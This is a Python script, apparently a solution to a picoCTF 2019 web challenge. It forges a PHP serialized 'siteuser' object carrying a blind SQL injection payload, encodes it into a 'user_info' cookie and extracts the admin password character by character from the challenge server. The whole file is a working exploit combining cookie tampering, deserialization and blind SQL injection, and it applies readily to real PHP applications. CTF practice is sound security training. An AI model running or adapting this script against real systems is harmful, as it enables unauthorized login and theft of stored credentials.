#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import base64
import urllib.parse
import requests
import string

url = "http://2019shell1.picoctf.com:62195/index.php?file=admin"
candidates = """abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}0123456789!$-.<=>?@_"""

def rewrite_param(username, password):
	param = b"""O:8:"siteuser":2:{s:8:"username";s:""" + \
		str(len(username)).encode() + b':"' + username + \
		b"""";s:8:"password";s:""" + \
		str(len(password)).encode() + b':"' + password + \
		b"""";}"""
	print(param)
	return param

if __name__ == '__main__':
	flag = b''
	while b'}' not in flag:
		for c in candidates:
			try_pass = flag + c.encode()
			attack_param = rewrite_param(b"admin", b"' OR SUBSTR(password,1," \
				+ str(len(try_pass)).encode() + b")='"+ try_pass)
			#print(attack_param)
			attack_cookie = urllib.parse.quote(urllib.parse.quote(base64.b64encode(attack_param)))

			cookies = {'user_info': attack_cookie}
			res = requests.get(url, cookies=cookies)
			if res.status_code != 500:
				if 'Welcome to the admin page!' in res.text:
					flag += c.encode()
					print(flag)
					break
				else:
					print('*', end='')
	print(b'flag: ' + flag)
